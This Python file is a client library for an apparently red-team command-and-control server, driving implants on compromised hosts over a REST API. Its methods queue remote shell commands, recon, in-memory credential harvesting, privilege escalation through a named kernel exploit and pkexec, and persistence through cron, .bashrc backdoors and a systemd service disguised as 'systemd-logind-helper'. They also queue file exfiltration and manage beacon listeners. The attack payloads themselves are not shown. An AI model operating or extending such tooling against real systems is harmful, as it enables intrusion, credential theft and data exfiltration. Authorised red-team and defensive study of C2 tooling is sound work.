#!/usr/bin/env python3
"""
C2 Client — Python library for the Red Team C2 framework.

The C2 server exposes a REST API. Default port is 80 (HTTP) or 443 (HTTPS).
All interactions go through this API — no special protocol needed.

Usage:
    from c2client import C2Client

    c2 = C2Client("http://localhost:8080")

    # List sessions
    for s in c2.sessions():
        print(f"{s['hostname']} | {s['status']}")

    # Queue a shell command
    cid = c2.shell("test-host-aa:bb", "whoami")
    print(f"Command queued: {cid}")

    # Wait for result
    result = c2.wait_result("test-host-aa:bb", cid)
    print(result.get("stdout"))
"""

import time
import requests
import json
from typing import Optional, Any


class C2Client:
    """Client for the C2 REST API."""

    def __init__(self, base_url: str = "http://localhost:10337", timeout: int = 10):
        self.base = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers["Content-Type"] = "application/json"

    def _get(self, path: str) -> dict:
        r = self.session.get(f"{self.base}{path}", timeout=self.timeout)
        r.raise_for_status()
        return r.json()

    def _get_optional(self, path: str) -> dict | None:
        """GET that returns None on 404 instead of raising."""
        r = self.session.get(f"{self.base}{path}", timeout=self.timeout)
        if r.status_code == 404:
            return None
        r.raise_for_status()
        return r.json()

    def _post(self, path: str, data: dict) -> dict:
        r = self.session.post(f"{self.base}{path}", json=data, timeout=self.timeout)
        r.raise_for_status()
        return r.json()

    # ── Sessions ──────────────────────────────────────────────────

    def sessions(self) -> list[dict]:
        """List all active implant sessions."""
        return self._get("/api/v1/sessions")["sessions"]

    def session(self, implant_id: str) -> dict:
        """Get session detail with command history."""
        return self._get(f"/api/v1/sessions/{implant_id}")

    def active_sessions(self) -> list[dict]:
        """Return only active sessions (seen in last 5 min)."""
        return [s for s in self.sessions() if s.get("status") == "active"]

    def find_by_hostname(self, hostname: str) -> Optional[dict]:
        """Find a session by hostname substring."""
        for s in self.sessions():
            if hostname in s.get("hostname", ""):
                return s
        return None

    # ── Commands ──────────────────────────────────────────────────

    def queue(self, implant_id: str, module: str, action: str,
              args: dict | None = None, timeout: int = 60) -> str:
        """Queue a command. Returns the command_id."""
        payload = {
            "module": module,
            "action": action,
            "args": args or {},
            "timeout_secs": timeout,
        }
        resp = self._post(f"/api/v1/sessions/{implant_id}/commands", payload)
        return resp["command_id"]

    def shell(self, implant_id: str, cmd: str) -> str:
        """Queue a shell command. Returns command_id."""
        return self.queue(implant_id, "shell", "exec", {"cmd": cmd})

    def recon_passive(self, implant_id: str) -> str:
        """Queue passive recon (/proc reads, stealth)."""
        return self.queue(implant_id, "recon", "passive")

    def recon_active(self, implant_id: str) -> str:
        """Queue active recon (ping sweep, ip, ss — noisy)."""
        return self.queue(implant_id, "recon", "active")

    def recon_arp(self, implant_id: str) -> str:
        """Queue quick ARP table read."""
        return self.queue(implant_id, "recon", "arp")

    def creds(self, implant_id: str, mode: str = "in_memory") -> str:
        """Queue credential harvest (in_memory=stealth, shell=noisy)."""
        return self.queue(implant_id, "creds", "harvest", {"mode": mode})

    def privesc_copyfail(self, implant_id: str) -> str:
        """Queue CopyFail kernel exploit escalation."""
        return self.queue(implant_id, "privesc", "copyfail")

    def privesc_pkexec(self, implant_id: str) -> str:
        """Queue pkexec GUI prompt escalation."""
        return self.queue(implant_id, "privesc", "pkexec")

    def persist_cron(self, implant_id: str) -> str:
        """Queue @reboot cron persistence."""
        return self.queue(implant_id, "persist", "cron")

    def persist_systemd(self, implant_id: str, service_name: str = "systemd-logind-helper") -> str:
        """Queue systemd service persistence."""
        return self.queue(implant_id, "persist", "systemd", {"service_name": service_name})

    def persist_bashrc(self, implant_id: str) -> str:
        """Queue .bashrc backdoor persistence."""
        return self.queue(implant_id, "persist", "bashrc")

    def exfil(self, implant_id: str, path: str) -> str:
        """Queue file exfiltration."""
        return self.queue(implant_id, "exfil", "file", {"path": path})

    def download(self, implant_id: str, path: str) -> str:
        """Queue file download from implant."""
        return self.queue(implant_id, "file", "read", {"path": path})

    def marker(self, implant_id: str, location: str = "operator") -> str:
        """Queue forensic marker write to /dev/shm."""
        return self.queue(implant_id, "marker", "write", {"location": location})

    def system_info(self, implant_id: str) -> str:
        """Queue system info request (hostname, PID, OS, config)."""
        return self.queue(implant_id, "system", "info")

    def system_exit(self, implant_id: str) -> str:
        """Queue implant termination."""
        return self.queue(implant_id, "system", "exit")

    # ── Results ───────────────────────────────────────────────────

    def commands(self, implant_id: str) -> list[dict]:
        """Get command history for a session."""
        return self._get(f"/api/v1/sessions/{implant_id}/commands")

    def command(self, implant_id: str, command_id: str) -> dict | None:
        """Get a single command record. Returns None if not found (still pending)."""
        return self._get_optional(f"/api/v1/sessions/{implant_id}/commands/{command_id}")

    def result(self, implant_id: str, command_id: str) -> dict | None:
        """Get result data for a command, or None if not yet completed/not found."""
        cmd = self.command(implant_id, command_id)
        if cmd is None:
            return None  # still pending
        status = cmd.get("status", "")
        if status in ("completed", "failed"):
            return cmd.get("result", {})
        return None  # still pending/sent

    def wait_result(self, implant_id: str, command_id: str,
                    poll_interval: float = 2.0, timeout: float = 120.0) -> dict | None:
        """Poll until a command completes. Returns result dict or None on timeout."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            r = self.result(implant_id, command_id)
            if r is not None:
                return r
            time.sleep(poll_interval)
        return None

    def pending_count(self, implant_id: str) -> int:
        """Number of pending commands for a session."""
        s = self.session(implant_id)
        return s["session"].get("pending_commands", 0)

    # ── Listener management ──────────────────────────────────────

    def listeners(self) -> list[dict]:
        """List active beacon listeners."""
        return self._get("/api/v1/listeners")

    def start_listener(self, port: int, protocol: str = "http") -> dict:
        """Start a beacon listener on the given port."""
        return self._post("/api/v1/listeners", {"port": port, "protocol": protocol})

    def stop_listener(self, port: int) -> None:
        """Stop a beacon listener."""
        self.session.delete(f"{self.base}/api/v1/listeners/{port}").raise_for_status()

    # ── Convenience ───────────────────────────────────────────────

    def health(self) -> bool:
        """Check if C2 server is reachable."""
        try:
            r = self.session.get(f"{self.base}/health", timeout=3)
            return r.status_code == 200
        except Exception:
            return False

    def stats(self) -> dict:
        """Quick stats: session count, active count."""
        all_s = self.sessions()
        active = sum(1 for s in all_s if s.get("status") == "active")
        idle = sum(1 for s in all_s if s.get("status") == "idle")
        return {"total": len(all_s), "active": active, "idle": idle}


# ── CLI demo ──────────────────────────────────────────────────────

if __name__ == "__main__":
    import sys

    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:80"
    c2 = C2Client(url)

    if not c2.health():
        print(f"[!] C2 not reachable at {url}")
        sys.exit(1)

    print(f"C2 @ {url} — {c2.stats()}")
    print()

    sessions = c2.sessions()
    if not sessions:
        print("No sessions. Waiting for implants...")
        sys.exit(0)

    for s in sessions:
        print(f"  {s['hostname']:12s} {s['implant_id']:30s} {s['status']:8s} {s['privileges']:6s}")

    # Demo: send shell command to first active session
    active = c2.active_sessions()
    if active:
        target = active[0]["implant_id"]
        host = active[0]["hostname"]
        print(f"\n[*] Sending 'id' to {host}...")
        cid = c2.shell(target, "id")
        print(f"    Command: {cid[:8]}...")

        result = c2.wait_result(target, cid, timeout=120)
        if result:
            print(f"    stdout: {result.get('stdout', '').strip()}")
        else:
            print("    (timed out waiting for beacon cycle)")
